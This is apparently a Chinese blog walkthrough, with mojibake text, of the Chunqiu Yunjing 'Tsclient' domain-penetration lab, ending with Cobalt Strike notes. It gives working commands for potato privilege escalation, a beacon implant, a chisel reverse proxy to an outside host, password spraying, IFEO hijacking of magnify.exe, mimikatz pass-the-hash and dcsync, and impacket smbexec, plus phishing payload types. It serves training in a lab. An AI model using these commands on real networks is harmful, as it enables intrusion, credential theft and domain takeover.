---
title: "æ˜¥ç§‹äº‘å¢ƒ-Tsclient"
description: "Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚"
date: 2025-08-01
tags:
  - "æ˜¥ç§‹äº‘å¢ƒ"
  - "Tsclient"
  - "åŸŸæ¸—é€"
  - "ä»£ç†è½¬å‘"
authors:
  - "bx"
draft: false              # è®¾ä¸º true åˆ™ä¸ºè‰ç¨¿
slug: "tsclient"          # éšæœºURLå­—ç¬¦ä¸²
---
<meta name="referrer" content="no-referrer">

# æ˜¥ç§‹äº‘å¢ƒ-Tsclient&Cobalt Strikeå­¦ä¹ 

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754279889160-4de3ffce-f8d7-4f01-9ae5-3be8e7038f1d.png)

Tsclientæ˜¯ä¸€å¥—éš¾åº¦ä¸ºä¸­ç­‰çš„é¶åœºç¯å¢ƒï¼Œå®Œæˆè¯¥æŒ‘æˆ˜å¯ä»¥å¸®åŠ©ç©å®¶äº†è§£å†…ç½‘æ¸—é€ä¸­çš„ä»£ç†è½¬å‘ã€å†…ç½‘æ‰«æã€ä¿¡æ¯æ”¶é›†ã€ç‰¹æƒæå‡ä»¥åŠæ¨ªå‘ç§»åŠ¨æŠ€æœ¯æ–¹æ³•ï¼ŒåŠ å¼ºå¯¹åŸŸç¯å¢ƒæ ¸å¿ƒè®¤è¯æœºåˆ¶çš„ç†è§£ï¼Œä»¥åŠæŒæ¡åŸŸç¯å¢ƒæ¸—é€ä¸­ä¸€äº›æœ‰è¶£çš„æŠ€æœ¯è¦ç‚¹ã€‚è¯¥é¶åœºå…±æœ‰3ä¸ªflagï¼Œåˆ†å¸ƒäºä¸åŒçš„é¶æœºã€‚

```python
â¯ .\fscan.exe -h 39.99.128.61
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚    ___                              _        â”‚
â”‚   / _ \     ___  ___ _ __ __ _  ___| | __    â”‚
â”‚  / /_\/____/ __|/ __| '__/ _` |/ __| |/ /    â”‚
â”‚ / /_\\_____\__ \ (__| | | (_| | (__|   <     â”‚
â”‚ \____/     |___/\___|_|  \__,_|\___|_|\_\    â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
      Fscan Version: 2.0.1

[716ms]     å·²é€‰æ‹©æœåŠ¡æ‰«ææ¨¡å¼
[716ms]     å¼€å§‹ä¿¡æ¯æ‰«æ
[716ms]     æœ€ç»ˆæœ‰æ•ˆä¸»æœºæ•°é‡: 1
[718ms]     å¼€å§‹ä¸»æœºæ‰«æ
[718ms]     ä½¿ç”¨æœåŠ¡æ’ä»¶: activemq, cassandra, elasticsearch, findnet, ftp, imap, kafka, ldap, memcached, modbus, mongodb, ms17010, mssql, mysql, neo4j, netbios, oracle, pop3, postgres, rabbitmq, rdp, redis, rsync, smb, smb2, smbghost, smtp, snmp, ssh, telnet, vnc, webpoc, webtitle
[718ms]     æœ‰æ•ˆç«¯å£æ•°é‡: 233
[748ms] [*] ç«¯å£å¼€æ”¾ 39.99.128.61:80
[1.8s] [*] ç«¯å£å¼€æ”¾ 39.99.128.61:1433
[3.7s]     æ‰«æå®Œæˆ, å‘ç° 2 ä¸ªå¼€æ”¾ç«¯å£
[3.7s]     å­˜æ´»ç«¯å£æ•°é‡: 2
[3.7s]     å¼€å§‹æ¼æ´æ‰«æ
[3.7s]     POCåŠ è½½å®Œæˆ: æ€»å…±387ä¸ªï¼ŒæˆåŠŸ387ä¸ªï¼Œå¤±è´¥0ä¸ª
[5.1s] [*] ç½‘ç«™æ ‡é¢˜ http://39.99.128.61       çŠ¶æ€ç :200 é•¿åº¦:703    æ ‡é¢˜:IIS Windows Server
[21.5s] [+] MSSQL 39.99.128.61:1433 sa 1qaz!QAZ
[21.5s]     æ‰«æå·²å®Œæˆ: 3/3
```

æ‰«æ å‘ç°æ˜¯ IIS æœåŠ¡ 

ç„¶åæ‰«æåˆ° MSSQL å¯†ç æ³„éœ²

æˆ‘ä»¬ä½¿ç”¨ MDUT è¿æ¥ä¸Šå»

##  flag01
è¿æ¥ä¸Šæ¥

4 ä¸ªæ¨¡å¼ï¼Œç»è¿‡æµ‹è¯• SpOA å¯ä»¥æ‰§è¡Œå‘½ä»¤ 

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280363704-8ed08222-77b9-4651-bff6-486cd1f82e7d.png)

å½“å‰æƒé™è¿‡ä½ä»€ä¹ˆä¹Ÿæ“ä½œä¸äº†ï¼Œä¸Šä¼ åœŸè±†

ææƒåˆ° system

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280829271-eb8de10d-2fd3-4878-9d2a-85bc8c8516a9.png)

æœ‰æƒé™äº†ï¼Œå…ˆè¯»å–è¿™ä¸ªæœºå™¨çš„ flag

```python
C:/è¿…é›·ä¸‹è½½/SweetPotato.exe -a "type C:\Users\Administrator\flag\flag01.txt"
```

ç»“æœå¦‚ä¸‹ 

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754280897682-c135bd83-8927-44e6-b87c-95cca6d7aff0.png)

ç»§ç»­æ¸—é€ 

## flag02
æ ¹æ®é¢˜ç›®è¦æ±‚æˆ‘ä»¬ä¸Šçº¿ CSï¼Œç”¨ system æƒé™ç»™ï¼Œä¸ç„¶ä»€ä¹ˆä¹Ÿå¹²ä¸äº†

```python
C:/è¿…é›·ä¸‹è½½/SweetPotato.exe -a "C:/Users/Public/beacon.exe"
```

ok æˆåŠŸä¸Šçº¿

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282849749-6c91cc78-743e-419c-9c89-87cbc2a04b3c.png)

æˆ‘ä»¬è·å–ä¸€ä¸‹ä¿¡æ¯å’Œéšä¾¿æµ‹ä¸€ä¸‹

æˆ‘ä»¬åœ¨ CS ä¸­æ‰§è¡Œ

```python
hashdump
```

æœ€åç»“æœå¦‚ä¸‹

```python
Administrator:500:aad3b435b51404eeaad3b435b51404ee:2caf35bb4c5059a3d50599844e2b9b1f:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John:1008:aad3b435b51404eeaad3b435b51404ee:eec9381b043f098b011be51622282027:::

```

æ‰€æœ‰ç”¨æˆ·çš„ LM å“ˆå¸Œéƒ½æ˜¯ aad3b435b51404eeaad3b435b51404eeã€‚è¿™æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„å“ˆå¸Œå€¼ï¼Œä»£è¡¨ç€â€œç©ºâ€çš„ LM å“ˆå¸Œã€‚è¿™é€šå¸¸æ„å‘³ç€ï¼š

ç³»ç»Ÿç¦ç”¨äº† LM å“ˆå¸Œçš„å­˜å‚¨ï¼ˆè¿™æ˜¯ç°ä»£ Windows ç³»ç»Ÿçš„é»˜è®¤å®‰å…¨è®¾ç½®ï¼‰ã€‚



æŸ¥çœ‹åœ¨çº¿ç”¨æˆ·å¯ä»¥å‘ç°è¿˜å­˜åœ¨ä¸€ä¸ª John ç”¨æˆ·

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754281697142-31936f09-d7c5-44db-bd54-68593ba36794.png)

è¿›è¡Œæ³¨å…¥è¿›ç¨‹ä¸Šçº¿ï¼Œç„¶åè¿›å…¥ john ç”¨æˆ·

> è¯•å‡ ä¸ªè¿›ç¨‹
>

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282000893-240e4c7b-1a50-4981-974e-8bbb0115e232.png)

å¯ä»¥å‘ç°æ³¨å…¥æˆåŠŸï¼Œè¿™é‡Œä¹Ÿæ˜¯ä¸Šçº¿äº† 

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754281985693-fb1d680b-1113-4475-b8b2-f5ea555f664f.png)

å¯ä»¥å‘ç°å­˜åœ¨å…±äº«æ–‡ä»¶å¤¹ğŸ“‚

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282153435-4d45ea6b-4418-4e82-8c5f-e05cd452aff7.png)

æŸ¥çœ‹æ–‡ä»¶

```python
shell dir \\tsclient\c
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754282475992-100bb6f6-8de9-4032-a758-25b3b7338ab4.png)

```python
shell type \\tsclient\c\credential.txt
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754288503759-b8bbb3fc-b10a-4f79-a76e-6b6cb8696996.png)

å¾—åˆ°ä¸€ä¸ªå¯†ç 

```python
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

#æç¤º
hijiack Image
å°±æ˜¯æ˜ åƒåŠ«æŒ 
```

æ ¹æ®æç¤ºï¼Œå…ˆäº†è§£ä¸€ä¸‹ä»€ä¹ˆæ˜¯æ˜ åƒåŠ«æŒï¼Œæ€ä¹ˆåˆ©ç”¨

[å†…ç½‘æƒé™ç»´æŒâ€”â€”æ˜ åƒåŠ«æŒ&CLRåŠ«æŒ-CSDNåšå®¢](https://blog.csdn.net/qq_55202378/article/details/140895624)

æŸ¥çœ‹ä¸€ä¸‹æœºå­ä¿¡æ¯

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754287797339-f5b1114f-1018-4110-8e85-8e1c5a197cbc.png)

```python
shell C:\Users\fscan.exe -h 172.22.8.0/24 > C:\Users\Public\1.txt
```

ä¸Šä¼  fscan

æ‰«æä¸€ä¸‹å†…ç½‘

```python
å­˜æ´»ä¸»æœºï¼ˆICMPï¼‰ï¼š172.22.8.18, 172.22.8.15, 172.22.8.31, 172.22.8.46
æœ‰æ•ˆç«¯å£æ•°é‡: 17
å¼€æ”¾ç«¯å£ç¤ºä¾‹ï¼š
172.22.8.18:139, 172.22.8.31:445, 172.22.8.31:139, 172.22.8.31:135, ...
å‘ç°çš„ä¸»æœºåï¼ˆéƒ¨åˆ†ï¼‰ï¼š
172.22.8.46: WIN2016
172.22.8.31: WIN19-CLIENT
172.22.8.15: DC01
172.22.8.18: WIN-WEB
ç½‘ç«™æ ‡é¢˜ï¼š
http://172.22.8.18 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server
http://172.22.8.46 çŠ¶æ€ç :200 é•¿åº¦:703 æ ‡é¢˜:IIS Windows Server
å‘ç° MSSQL å¼±å£ä»¤ï¼š
MSSQL 172.22.8.18:1433 sa 1qaz!QAZ
```

18 æœºå­æˆ‘ä»¬å·²ç»æ‹¿ä¸‹æ¥äº† 

æ ¹æ®åˆšæ‰çš„æç¤ºï¼Œç»§ç»­ä¸Š chisel ä»£ç†ä¸€ä¸‹

```python
C:/Users/Public/SweetPotato.exe -a "C:/Users/Public/chisel.exe client 43.134.9.57:8000 R:0.0.0.0:1080:socks"
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754288437946-4d4dba5e-4b91-46a0-957c-5896d48b4ee3.png)

å¼€å¯ä»£ç†ï¼Œå–·æ’’ä¸€ä¸‹åˆšåˆšç»™çš„å¯†ç 

> è¿™é‡Œåˆ©ç”¨crackmapexec å·¥å…·
>

```python
â”Œâ”€â”€(rootã‰¿kali)-[/mnt/hgfs/shared]
â””â”€# proxychains crackmapexec smb 172.22.8.1/24 -u Aldrich -p 'Ald@rLMWuy7Z!#' -d xiaorang.lab 2>/dev/null

[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing WINRM protocol database
[*] Initializing MSSQL protocol database
[*] Initializing FTP protocol database
[*] Initializing SSH protocol database
[*] Initializing RDP protocol database
[*] Initializing LDAP protocol database
[*] Initializing SMB protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         172.22.8.46     445    WIN2016          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN2016) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [*] Windows 10 / Server 2019 Build 17763 x64 (name:WIN19-CLIENT) (domain:xiaorang.lab) (signing:False) (SMBv1:False)
SMB         172.22.8.15     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:xiaorang.lab) (signing:True) (SMBv1:False)
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.18     445    WIN-WEB          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_LOGON_FAILURE 
```

è¿™é‡Œå‘ç°ä¸‰ä¸ªæç¤ºæ˜¯å¯†ç è¿‡æœŸäº†

```python
SMB         172.22.8.46     445    WIN2016          [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.18     445    WIN-WEB          [*] Windows Server 2016 Datacenter 14393 x64 (name:WIN-WEB) (domain:xiaorang.lab) (signing:False) (SMBv1:True)
SMB         172.22.8.31     445    WIN19-CLIENT     [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
SMB         172.22.8.15     445    DC01             [-] xiaorang.lab\Aldrich:Ald@rLMWuy7Z!# STATUS_PASSWORD_EXPIRED 
```

åˆ©ç”¨è„šæœ¬æ‰¹é‡æ”¹ä¸‹å¯†ç  

```python
proxychains python3 smbpasswd.py xiaorang.lab/Aldrich:'Ald@rLMWuy7Z!#'@172.22.8.15 -newpass 'U*MT%yB22fU5aT'
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754290247910-22c4f958-cb41-48a6-bbcf-b87727e99065.png)

15 æœºå­ï¼Œè¿ä¸ä¸Š

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754290356428-82a81f29-cddd-448f-aa59-02205bfd37a7.png)

RDP å°è¯•è¿æ¥ 46 æœºå­

```python
aldrich@xiaorang.lab
U*MT%yB22fU5aT
```

è¿ä¸Šæ¥

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754291322022-1a405eea-da32-413b-ba8c-f8652c91492a.png)

åœ¨ PS ä¸­æ‰§è¡Œå‘½ä»¤ï¼ŒæŸ¥çœ‹æƒé™

```python
get-acl -path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options" | fl *
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754290883083-1f98c6b0-37c3-4dfd-b6c3-b22f33303094.png)

```python
PSPath                  : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
                          ersion\Image File Execution Options
PSParentPath            : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
                          ersion
PSChildName             : Image File Execution Options
PSDrive                 : HKLM
PSProvider              : Microsoft.PowerShell.Core\Registry
CentralAccessPolicyId   :
CentralAccessPolicyName :
Path                    : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentV
                          ersion\Image File Execution Options
Owner                   : NT AUTHORITY\SYSTEM
Group                   : NT AUTHORITY\SYSTEM
Access                  : {System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.RegistryAcce
                          ssRule, System.Security.AccessControl.RegistryAccessRule, System.Security.AccessControl.Regis
                          tryAccessRule...}
Sddl                    : O:SYG:SYD:PAI(A;CIIO;KA;;;CO)(A;CI;CCDCLCSWRPRC;;;AU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)(A;CI;KR;;;B
                          U)(A;CI;KR;;;AC)
AccessToString          : CREATOR OWNER Allow  FullControl
                          NT AUTHORITY\Authenticated Users Allow  SetValue, CreateSubKey, ReadKey
                          NT AUTHORITY\SYSTEM Allow  FullControl
                          BUILTIN\Administrators Allow  FullControl
                          BUILTIN\Users Allow  ReadKey
                          APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES Allow  ReadKey
AuditToString           :
AccessRightType         : System.Security.AccessControl.RegistryRights
AccessRuleType          : System.Security.AccessControl.RegistryAccessRule
AuditRuleType           : System.Security.AccessControl.RegistryAuditRule
AreAccessRulesProtected : True
AreAuditRulesProtected  : False
AreAccessRulesCanonical : True
AreAuditRulesCanonical  : True
```

æˆ‘ä»¬ç™»å½•çš„äººéƒ½å¯ä»¥ä¿®æ”¹æ³¨å†Œè¡¨

```python
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe"
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754291006508-a4e3b3d0-41ed-465c-98bb-1b54d2718f79.png)

> **ç»™ **`**magnify.exe**`**è®¾ç½®äº†ä¸€ä¸ª"è°ƒè¯•å™¨",å½“ç”¨æˆ·æˆ–ç³»ç»Ÿå¯åŠ¨ magnify.exe æ—¶ï¼Œå¹¶ä¸ä¼šçœŸæ­£å¯åŠ¨æ”¾å¤§é•œç¨‹åºï¼Œè€Œæ˜¯å¯åŠ¨äº† C:\windows\system32\cmd.exe**
>

æ”¾å¤§é•œææƒ

1. å…ˆè¿›å…¥é”å®šç•Œé¢
2. ç„¶åç‚¹å‡»å›¾ç‰‡ä¸­å³ä¸‹è§’å›¾æ ‡
3. é€‰æ‹©å‘å¤§é•œ
4. è§¦å‘è¿›å…¥ System æƒé™ç»ˆç«¯

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754291377800-d1a4d6af-e45f-450c-925c-c02ee0081b99.png)

ä¸ºäº†æ–¹ä¾¿å‘½ä»¤æ‰§è¡Œ

æˆ‘ä»¬è®¾ç½®	CS è½¬å‘ï¼Œåœ¨åŸæ¥æœºå­çš„åŸºç¡€ä¸Šï¼Œè®¿é—®å†…éƒ¨ç½‘ç»œ

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754293595044-31c15544-3f75-4efb-ad27-8534a8b16ab9.png)

ä½†æ˜¯ä¸æ˜¯å¾ˆç¨³å®šï¼Œè¿‡ä¸ªå‡ åˆ†é’Ÿå°±ä¼šå´©æºƒæ‰

ä¹Ÿæ˜¯æ‹¿åˆ° flag2

```python
shell type C:\Users\Administrator\flag\flag02.txt
```

## flag03
ä¸Šä¼ çŒ•çŒ´æ¡ƒ

> RDP é‡Œé¢å¯ä»¥ç›´æ¥ç²˜è´´å¤åˆ¶æœ¬æœºæ–‡ä»¶å’Œå†…å®¹
>

æˆ‘ç›´æ¥ä¸Šä¼ åˆ°æ¡Œé¢`C:\Users\Aldrich\Desktop`

è·å–ä¸€äº›ä¿¡æ¯

```python
logonpasswords
shell net user /domain
```

å°±æ˜¯å‘ç°`win2016$`åœ¨åŸŸç®¡ç»„é‡Œé¢

æ‰¾åˆ°å¯¹åº”çš„ HASH å€¼

_è¿™é‡Œå›¾ç‰‡æ²¡æˆªå›¾å¥½ï¼ŒæŠ±æ­‰_

```python
shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe "privilege::debug" "sekurlsa::pth /user:WIN2016$ /domain:xiaorang.lab /ntlm:e2b1058677aab11c6b7359eb7d8d4d77" "exit"
```

è·å¾—å¯¹åº” hash å€¼

```python
shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe "privilege::debug" "lsadump::dcsync /domain:xiaorang.lab /all /csv" "exit"
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754293502665-c25a9097-22d7-4399-bf10-9a84580c55cf.png)

æœ€åä½¿ç”¨**Pass-the-Hash**

```python
â”Œâ”€â”€(rootã‰¿kali)-[/mnt/â€¦/shared/impacket-0.12.0/impacket-0.12.0/examples]
â””â”€# proxychains python3 smbexec.py -hashes :2c9d81bdcf3ec8b1def10328a7cc2f08 administrator@172.22.8.15

[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[proxychains] Strict chain  ...  43.134.9.57:1088  ...  172.22.8.15:445  ...  OK
[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>type C:\Users\Administrator\flag\flag03.txt
 _________               __    _                  _    
|  _   _  |             [  |  (_)                / |_  
|_/ | | \_|.--.   .---.  | |  __  .---.  _ .--. `| |-' 
    | |   ( (`\] / /'`\] | | [  |/ /__\\[ `.-. | | |   
   _| |_   `'.'. | \__.  | |  | || \__., | | | | | |,  
  |_____| [\__) )'.___.'[___][___]'.__.'[___||__]\__/  


Congratulations! ! !

flag03: flag{47227631-3839-45c1-ae12-8fe7a6d876f6}

```

æ‰§è¡Œè¿™ä¸ªè„šæœ¬å¯ä»¥è·å¾—ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„äº¤äº’

æˆ‘ä»¬å¾—åˆ°è¿™ä¸ª 15 æœºå­çš„ system æƒé™

å¾—åˆ° flag03

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754293301319-fa58f1e9-2043-4c37-975f-8ad4fa71940e.png)



## Others
### Cobalt Strike
å¯èƒ½ç°åœ¨éƒ½ç”¨çš„æ˜¯ CS çš„è¡ç”Ÿå·¥å…·

#### æ­å»º cs å¹³å°


å¦‚ä½•é…ç½® CS çœ‹ä¸‹é¢è¿™ä¸ªæ–‡ç« 

[Cobalt Strike å®‰è£…ä¸é…ç½® | XSTARK](https://red.lintstar.top/RAT/CobaltStrike/deploy)

å®‰è£… Java 11huanjing

```python
sudo apt install openjdk-11-jdk
```

é…ç½® server

```python
43.134.9.57
./teamserver 43.134.9.57 pass
```

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754279183471-d89e859e-7d38-4531-b0c0-15f222fffc8c.png)

åœ¨ client è¿æ¥è¿›æ¥

![](https://cdn.nlark.com/yuque/0/2025/png/42994824/1754279352877-f92716f4-9172-4136-9e50-8976025d4a14.png)



#### Payload ç§ç±»å’Œé€‰æ‹© 
1. **HTML Application**
    - ç”Ÿæˆä¸€ä¸ª .hta æ ¼å¼çš„æ¶æ„ HTML åº”ç”¨ç¨‹åºï¼Œé€‚åˆç”¨äºé’“é±¼é‚®ä»¶ã€Web social engineering ç­‰åœºæ™¯ï¼Œåœ¨ç›®æ ‡æµè§ˆå™¨ä¸­æ‰§è¡Œåè§¦å‘ payloadã€‚
2. **MS Office Macro**
    - ç”Ÿæˆä¸€ä¸ªå¯åµŒå…¥ Wordã€Excel ç­‰ Office æ–‡ä»¶çš„å®ï¼ˆVBA è„šæœ¬ï¼‰ï¼Œé€‚åˆé’“é±¼é‚®ä»¶é™„ä»¶ã€‚ç›®æ ‡æ‰“å¼€æ–‡æ¡£å¹¶å¯ç”¨å®åï¼Œæ‰§è¡Œ payloadã€‚
3. **Stager Payload Generator**
    - ç”Ÿæˆ"å°ä½“ç§¯çš„ç¬¬ä¸€é˜¶æ®µåŠ è½½å™¨"ï¼Œä¸»è¦ç”¨äºä¸‹è½½å’ŒåŠ è½½çœŸæ­£çš„ beaconï¼ˆå³äºŒé˜¶æ®µ payloadï¼‰ã€‚é€‚åˆéœ€è¦å…ˆç»•è¿‡æ€è½¯ã€å†æ‹‰ä¸‹ä¸» beacon çš„åœºæ™¯ã€‚
    - é€šå¸¸ä½“ç§¯å°ã€éšè”½æ€§å¥½ï¼Œä½†ä¾èµ–ç½‘ç»œäºŒæ¬¡ä¸‹è½½ã€‚
4. **Stageless Payload Generator**
    - ç”Ÿæˆ"ä¸€æ­¥åˆ°ä½çš„ä¸»è½½è·"ï¼Œä¸ä¼šåˆ†é˜¶æ®µï¼Œæ‰€æœ‰ä»£ç éƒ½æ‰“åŒ…åœ¨ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼Œé€‚åˆä¸å—ç½‘ç»œé™åˆ¶ã€å¯¹ä½“ç§¯è¦æ±‚ä¸é«˜çš„åœºæ™¯ã€‚
    - æ›´ç¨³å®šï¼Œä½†ä½“ç§¯è¾ƒå¤§ï¼Œæ£€æµ‹ç‡æœ‰æ—¶æ›´é«˜ã€‚
5. **Windows Stager Payload**
    - ä¸“é—¨ä¸º Windows å¹³å°ç”Ÿæˆ"åˆ†é˜¶æ®µ"payloadï¼ˆå³å…ˆä¸‹ stagerï¼Œå†åŠ è½½ beaconï¼‰ã€‚
    - é€‚åˆåœ¨ Windows é¶æœºä¸Šå…ˆæ‰§è¡Œä¸€å°æ®µä»£ç ï¼Œéšåè‡ªåŠ¨å›è¿ä¸» beaconã€‚
6. **Windows Stageless Payload**
    - ä¸“é—¨ä¸º Windows å¹³å°ç”Ÿæˆ"ä¸€æ­¥åˆ°ä½"çš„ payloadï¼Œæ‰€æœ‰å†…å®¹æ‰“åŒ…è¿›ä¸€ä¸ªæ–‡ä»¶ã€‚
    - é€‚åˆç›´æ¥éƒ¨ç½²åˆ° Windows é¶æœºï¼Œæ‰§è¡Œåç›´æ¥ä¸Šçº¿ã€‚
7. **Windows Stageless Generate All Payloads**
    - ä¸€æ¬¡æ€§ä¸º Windows å¹³å°ç”Ÿæˆæ‰€æœ‰ä¸»æµæ ¼å¼çš„"ä¸€æ­¥åˆ°ä½"payloadï¼Œæ¯”å¦‚ exeã€dllã€ps1ã€bin ç­‰ã€‚



#### Beacon å†…ç½®å‘½ä»¤
```python
argue			å‘½ä»¤è¡Œå‚æ•°æ¬ºéª—
blockdlls			ç¦æ­¢å­è¿›ç¨‹åŠ è½½éå¾®è½¯ç­¾åçš„dll
browserpivot			æ³¨å…¥æµè§ˆå™¨è¿›ç¨‹ä»£ç†ç”¨æˆ·å·²è®¤è¯èº«ä»½ï¼ˆä»…æ”¯æŒIEï¼‰
cancel			å–æ¶ˆæ­£åœ¨ä¸‹è½½çš„æ–‡ä»¶
cd			è·³è½¬ç›®å½•
checkin			å¼ºåˆ¶ç›®æ ‡å›è¿å¹¶æ›´æ–°çŠ¶æ€ï¼ˆç”¨äºDNSä¸Šçº¿ï¼ŒDNSæ¨¡å¼ä¸‹æ— æ–°ä»»åŠ¡æ—¶ç›®æ ‡ä¸ä¼šå›è¿Teamserverï¼‰
chromedump			æå–Chromeä¿å­˜çš„è´¦å·å¯†ç ã€Cookiesç­‰ä¿¡æ¯
covertvpn			éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯
clear			æ¸…ç©ºbeaconä»»åŠ¡é˜Ÿåˆ—
connect			é€šè¿‡TCPæ­£å‘è¿æ¥è¿œç¨‹Beacon
cp			å¤åˆ¶æ–‡ä»¶
dcsync			ä»åŸŸæ§æå–å¯†ç hash
desktop			è¿œç¨‹VNCæ§åˆ¶ç”¨æˆ·æ¡Œé¢
dllinject		æ³¨å…¥ä¸€ä¸ªå†…å­˜åå°„åŠ è½½çš„dllåˆ°ç›®æ ‡è¿›ç¨‹
dllload			ä½¿ç”¨LoadLibraryæ–¹å¼åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åŠ è½½ä¸€ä¸ªdll
download		ä¸‹è½½æ–‡ä»¶
downloads		åˆ—å‡ºæ‰€æœ‰æ­£åœ¨ä¸‹è½½çš„æ–‡ä»¶
drives			åˆ—å‡ºæ‰€æœ‰ç£ç›˜ç›˜ç¬¦
elevate			åˆ©ç”¨ææƒæ¼æ´è·å–ä¸€ä¸ªé«˜æƒé™Beacon
execute			åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åºï¼ˆæ— å›æ˜¾ï¼‰
execute-assembly	åœ¨ç›®æ ‡ä¸Šå†…å­˜åŠ è½½æ‰§è¡Œæœ¬åœ°.NETç¨‹åº
exit			ç»“æŸå½“å‰Beaconä¼šè¯
getprivs		åœ¨å½“å‰è¿›ç¨‹è®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰ä¸­å¯ç”¨systemç‰¹æƒ
getsystem		å°è¯•è·å–SYSTEMç”¨æˆ·æƒé™
getuid			è·å–å½“å‰è¿›ç¨‹è®¿é—®ä»¤ç‰Œï¼ˆaccess tokenï¼‰çš„ç”¨æˆ·ä¿¡æ¯
